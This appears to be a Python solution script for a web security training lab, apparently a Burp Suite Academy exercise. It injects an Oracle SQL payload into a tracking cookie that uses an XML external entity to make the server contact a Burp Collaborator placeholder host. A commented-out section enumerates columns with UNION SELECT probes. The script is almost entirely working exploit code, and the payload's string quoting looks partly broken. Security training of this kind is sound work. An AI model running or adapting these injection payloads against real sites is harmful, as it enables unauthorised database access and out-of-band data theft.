import sys
import logging
import urllib3
import urllib.parse

import requests

import utils
from shop import Shop

log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}] [{levelname}] [{name}] {message}",
    style="{", 
    datefmt="%H:%M:%S",
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def main(args):
    shop = Shop(args.url, args.no_proxy)
    log.info("Getting tracking id and session token.")
    if args.no_proxy:
        resp = requests.get(shop.base_url)
    else:
        resp = requests.get(shop.base_url, proxies=utils.PROXIES, verify=False)
    tracking_id = resp.cookies["TrackingId"]
    session_token = resp.cookies["session"]
    log.info(f"TrackingId: {tracking_id}")
    exploit = (
          f"{tracking_id}'+UNION SELECT EXTRACTVALUE(xmltype('
          '<?xml version="1.0" encoding="UTF-8"?>'
          "<!DOCTYPE root [ <!ENTITY % remote SYSTEM" 
          f"\"http://BURP-COLLABORATOR-SUBDOMAIN/">"
          " %remote;]>'),'/l') FROM dual-- "
)    
    exploit_encoded = urllib.parse.quote(exploit)
    cookies = {
        "TrackingId": exploit_encoded,
        "session": session_token,
    }    
    log.info("Sending exploit")
    if args.no_proxy:
        resp = requests.get(shop.base_url, cookies=cookies)
    else:
        resp = requests.get(shop.base_url, cookies=cookies, proxies=utils.PROXIES, verify=False
        )
    shop.is_solved()
        
        
        
"""
UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f>
<!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')
+FROM+dual--
"""        
        
        
        
        
   # hint = shop.get_hint()
   # print(hint)
   # nulls_list = ["NULL"]
   # num_columns = None
   # log.info("Determining number of culmn")
   # while len(nulls_list) < 50:
   #     nulls = ",".join(nulls_list)
   #     category = f"' UNION SELECT {nulls}-- "
   #     resp = shop.get_category(category)
   #     if resp.status_code == 200:
   #         num_columns = len(nulls_list)
   #         break
   #     nulls_list.append("NULL")
   # if num_columns:        
   #     log.info(f"Number of columns is : {num_columns}")
   # text_columns = []
   # for i in range (0, num_columns):
   #     nulls_list = ["NULL"] * num_columns    
   #     nulls_list[i] = "'a'"
   #     nulls = ",".join(nulls_list)
   #     category = f"' UNION SELECT {nulls}-- "
   #     resp = shop.get_category(category)
   #     if resp.status_code == 200:
   #         text_columns.append(i)
   # text_columns_str = ", ".join(map(str, text_columns))            
   # log.info(f"The text columns are: {text_columns_str}")
   # 
   # nulls_list = ["NULL"] * num_columns
   # nulls_list[text_columns[0]] = f"'{hint}'"
   # nulls = ",".join(nulls_list)
   #      
   # category = f"' UNION SELECT {nulls}-- "
   # resp = shop.get_category(category)
   # if resp.status_code == 200:    
   #     shop.is_solved()
    
    
if __name__ == "__main__":
    args=utils.parse_args(sys.argv)
    main(args)